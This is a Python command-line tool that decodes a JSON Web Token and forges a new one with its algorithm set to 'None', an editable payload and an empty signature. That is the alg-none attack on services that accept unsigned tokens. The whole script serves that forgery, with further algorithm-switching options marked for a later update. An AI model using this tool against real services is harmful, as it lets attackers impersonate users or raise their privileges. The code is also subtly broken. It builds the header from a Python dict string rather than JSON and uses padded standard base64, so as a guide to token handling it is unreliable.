import jwt
import re
import base64
import math
import json

class bcolors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'

def jwtWeak():
    """ Automate the progress of changing the algorithm of input JWT Token and then generate the new JWT based on changed algorithm """
    print("Enter the JWT Token:")
    in_jwt = input()

    if re.match(r'^[A-Za-z0-9-_=]+\.[A-Za-z0-9-_=]+\.?[A-Za-z0-9-_.+/=]*$',in_jwt):
        print(f"{bcolors.OKGREEN}\nThis is a valid input JWT Token{bcolors.ENDC}\n")     
        print(f"{bcolors.BOLD}*************************************************MAIN MENU*************************************************")
        

        choice = input("""
                      A: Base 64 Decode the input JWT [This Build]
                      B: Generate new JWT Token by changing the Algorithm of the input JWT to 'None'[This Build]
                      C: Generate new JWT Token by changing the Algorithm of the input JWT to 'HS256'[Next update]
                      D: Generate new JWT Token by changing the Algorithm of the input JWT to 'HS384'[Next update]
                      E: Generate new JWT Token by changing the Algorithm of the input JWT to 'HS512'[Next update]
                      Q: Quit/Log Out

                      Please enter your choice: """+f"{bcolors.ENDC}")
        print (f"{bcolors.BOLD}***********************************************************************************************************{bcolors.ENDC}")
#######################################################################################
        if choice == "A" or choice =="a":
            part_jwt=in_jwt.split('.')
            Header=part_jwt[0]
            Payload=part_jwt[1]
            Signature=part_jwt[2]
            print(f"{bcolors.WARNING}\n\tBefore Base64 Decode:{bcolors.ENDC}")
            #base64 encoded Header
            print("\n\tHeader="+Header)
            #base64 encoded Payload  
            print("\n\tPayload="+Payload)
            #base64 encoded Signature
            print("\n\tSignature="+Signature)
            
            
            print(f"{bcolors.WARNING}\n\tAfter Base64 Decode:{bcolors.ENDC}")
           
            
            if len(Header) % 4 != 0: #check if multiple of 4
                while len(Header) % 4 != 0:
                    Header = Header + "="
                req_str = base64.b64decode(Header)
            else:
                req_str = base64.b64decode(Header)
                req_str=req_str.decode('utf-8')
            #base64 decoded Header    
            print("\n\tHeader="+str(req_str))
            
            
            if len(Payload) % 4 != 0: #check if multiple of 4
                while len(Payload) % 4 != 0:
                    Payload = Payload + "="
                req_str = base64.b64decode(Payload)
            else:
                req_str = base64.b64decode(Payload)
                req_str=req_str.decode('utf-8')
            #base64 decoded Payload    
            print("\n\tPayload="+str(req_str))    
            
            
            if len(Signature) % 4 != 0: #check if multiple of 4
                while len(Signature) % 4 != 0:
                    Signature = Signature + "="
                req_str = base64.b64decode(Signature)
            else:
                req_str = base64.b64decode(Signature)    
            #base64 decoded Signature 
            print("\n\tSignature="+str(req_str))

#######################################################################################              
        elif choice == "B" or choice =="b":  
            part_jwt=in_jwt.split('.')
            Header=part_jwt[0]
            Payload=part_jwt[1]
            Signature=part_jwt[2]
            print(f"{bcolors.WARNING}\n\tBefore Algorithm Coversion:{bcolors.ENDC}")
            if len(Header) % 4 != 0: #check if multiple of 4
                while len(Header) % 4 != 0:
                    Header = Header + "="
                req_str = base64.b64decode(Header)
            else:
                req_str = base64.b64decode(Header)
                req_str=req_str.decode('utf-8')
            json_header = json.loads(req_str)
            algo=json_header['alg']
            print(f"{bcolors.UNDERLINE}\n\tThe present algorithm -"+ algo+f"{bcolors.UNDERLINE}{bcolors.ENDC}")

            #base64 encoded Header
            print("\n\tHeader="+Header)
            #base64 encoded Payload  
            print("\n\tPayload="+Payload)
            #base64 encoded Signature
            print("\n\tSignature="+Signature) 
            
            print(f"{bcolors.WARNING}\n\tAfter Algorithm Changed to 'None':{bcolors.ENDC}")
            
            json_header['alg']='None'
            
            print("\n\tThe modified Header-"+str(json_header))
            if len(Payload) % 4 != 0: #check if multiple of 4
                while len(Payload) % 4 != 0:
                    Payload = Payload + "="
                req_str = base64.b64decode(Payload)
            else:
                req_str = base64.b64decode(Payload)
            b64decoded_payload=req_str.decode('utf-8')
            #base64 decoded Payload    
            print("\n\tPayload="+str(b64decoded_payload)) 
            

            print("\n\tPlease Enter the modified Payload in plain text format (if you want)")
            mod_payload=input()
            if re.match(r'(.*?)(?:")',mod_payload):
                print("\n\tModified payload is:"+mod_payload)
                json_header=str(json_header)
                b64_Header = base64.b64encode(json_header.encode("utf-8"))
                b64_encoded_header = str(b64_Header, "utf-8")
                mod_payload=str(mod_payload)
                b64_Payload = base64.b64encode(mod_payload.encode("utf-8"))
                b64_encoded_Payload = str(b64_Payload, "utf-8")   
                print("The New JWT Token with Algorithm changed to 'None':"+b64_encoded_header+"."+b64_encoded_Payload+".")
            elif not mod_payload:
                print("The payload is unchanged")
                json_header=str(json_header)
                b64_Header = base64.b64encode(json_header.encode("utf-8"))
                b64_encoded_header = str(b64_Header, "utf-8")
                b64decoded_payload=str(b64decoded_payload)
                b64_Payload = base64.b64encode(b64decoded_payload.encode("utf-8"))
                b64_encoded_Payload = str(b64_Payload, "utf-8")
                print("The New JWT Token with Algorithm changed to 'None':"+b64_encoded_header+"."+b64_encoded_Payload+".")
            else:
                print("Not Valid Payload") 
                
            
             
#######################################################################################                               
        #elif choice == "C" or choice =="c"
#######################################################################################
        #elif choice=="D" or choice=="d"
#######################################################################################
        #elif choice=="Q" or choice=="q"
         #SS       sys.exit
        else:
            print("You must only select either A,B,C,D or E.")
            print("Please try again")
                
    
    else:
        print("This is not a valid input JWT Token")


if __name__ == '__main__':
    jwtWeak()
    

 

